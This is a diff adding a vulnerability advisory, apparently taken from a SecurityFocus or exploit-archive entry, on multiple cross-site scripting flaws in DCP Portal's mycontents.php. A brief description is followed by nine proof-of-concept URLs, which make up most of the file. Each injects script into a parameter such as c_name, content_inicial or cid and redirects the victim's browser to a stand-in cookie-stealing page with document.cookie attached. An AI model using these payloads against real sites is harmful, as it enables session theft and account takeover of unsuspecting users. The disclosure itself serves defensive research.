@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/17050/info
+     
+DCP Portal is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+     
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+http://www.example.com/dcp-portal611/mycontents.php?action=content&c_name="><script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script>
+http://www.example.com/dcp-portal611/mycontents.php?action=content&content_inicial=&lt;/textarea&gt;<script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script> 
+http://www.example.com/dcp-portal611/mycontents.php?action=content&c_name="><script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script> 
+http://www.example.com/dcp-portal611/mycontents.php?action=addnews&c_name="><script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script>
+http://www.example.com/dcp-portal611/mycontents.php?action=addnews&content_inicial=&lt;/textarea&gt;<script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script> 
+http://www.example.com/dcp-portal611/mycontents.php?action=addnews&mode=write&dcp_editor_contingut_html=xyz&c_name=<script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script>&c_image_name=
+http://www.example.com/dcp-portal611/mycontents.php?action=addanns&c_name="><script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script>
+http://www.example.com/dcp-portal611/mycontents.php?action=updatecontent&cid="><script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script> 
+http://www.example.com/dcp-portal611/mycontents.php?action=updatecontent&cid=1&mode=write&c_image_name=xyz&c_name="><script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script> 
